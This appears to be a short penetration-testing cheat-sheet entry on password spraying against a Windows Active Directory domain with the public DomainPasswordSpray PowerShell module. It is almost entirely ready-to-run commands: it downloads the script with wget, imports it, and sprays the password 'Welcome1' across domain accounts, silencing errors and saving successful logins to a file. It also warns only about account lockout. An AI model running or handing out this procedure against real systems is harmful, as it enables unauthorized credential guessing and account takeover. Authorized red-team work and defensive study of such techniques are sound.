> Don't get locked out. See `Password policy` section
> Spray and pray

## `DomainPasswordSpray.ps1`

> Download, then transfer the ps module to windows with any method in `Misc/File Transfer`

```sh
wget https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1
```

Import module

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

Spray and pray

```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
